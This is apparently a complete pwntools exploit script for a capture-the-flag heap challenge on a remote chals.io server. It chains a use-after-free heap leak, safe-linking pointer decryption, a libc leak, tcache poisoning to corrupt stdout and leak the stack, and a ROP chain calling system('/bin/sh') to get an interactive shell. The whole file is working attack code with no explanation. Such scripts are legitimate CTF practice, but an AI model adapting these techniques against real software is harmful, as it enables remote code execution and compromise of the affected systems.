from pwn import *
import os
context.update(os = "linux", arch = "amd64", log_level= "debug")
#p = process("./main")
p = remote("0.cloud.chals.io",10605)
elf = ELF("./main", checksec = 0)
libc = elf.libc
def alpha(heap, target):
    return target ^ (heap >> 0xc)
def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain
def x(): gdb.attach(p)
def sl(choice) : p.sendlineafter("> ", str(choice))
def add(idx, size, data: bytes):
    sl(1)
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", str(size))
    p.sendlineafter("> ", data)
def free(idx):
    sl(2)
    p.sendlineafter("> ", str(idx))
def edit(idx, data : bytes):
    sl(3)
    p.sendlineafter("> ", str(idx))
    p.sendlineafter("> ", data)
def show(idx):
    sl(4)
    p.sendlineafter("> ", str(idx))
def main():
    add(0, 0x20, b"A" * 8)
    add(1, 0x20, b"B" * 8)
    add(2, 0x20, b"C" * 8)
    free(1)
    free(0)
    show(0)
    leak = u64(p.recvline().strip(b"\n").ljust(8,b"\x00"))
    leak = decrypt(leak)
    print(hex(leak))
    heap_base = leak - 0x2d0
    print(hex(heap_base))
    add(3, 0x600, b"H" * 8)
    add(4, 0x30, b"CONSO")
    free(3)
    show(3)
    libc_base = u64(p.recvline().strip(b"\n").ljust(8,b"\x00")) - libc.sym.main_arena - 96
    print(hex(libc_base))
    add(5, 0x150, b"A" * 8)
    add(6, 0x150, b"B" * 8)
    add(7, 0x10, b"CONSO")
    rdi = p64(0x000000000002daa2 + libc_base)
    ret = p64(0x000000000002d446 + libc_base)
    environ = libc_base + libc.sym.environ
    payload = p32(0xfbad1800) + p32(0) + p64(environ)*3 + p64(environ) + p64(environ + 0x8)*2 + p64(environ + 8) + p64(environ + 8)
    stdout = alpha(heap_base, libc_base + libc.sym._IO_2_1_stdout_)
    free(6)
    free(5)
    edit(5, p64(stdout))
    add(5, 0x150, b"A" * 8)
    add(6, 0x150, payload)
    stack = u64(p.recv(6).ljust(8,b"\x00"))
    print(hex(stack))
    stack = alpha(heap_base, stack - 0x158)
    add(8, 0x170, b"A" * 8)
    add(9, 0x170, b"B" * 8)
    add(10, 0x10, b"CONSO")
    free(9)
    free(8)
    system = libc_base + libc.sym.system
    payload = p64(0) + rdi + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + ret + p64(system)
    s = p64(libc_base + 0xda817) 
    edit(8, p64(stack))
    add(8, 0x170,b"A" * 8)
    add(9, 0x170, payload)
    #x()
    p.interactive()
main()
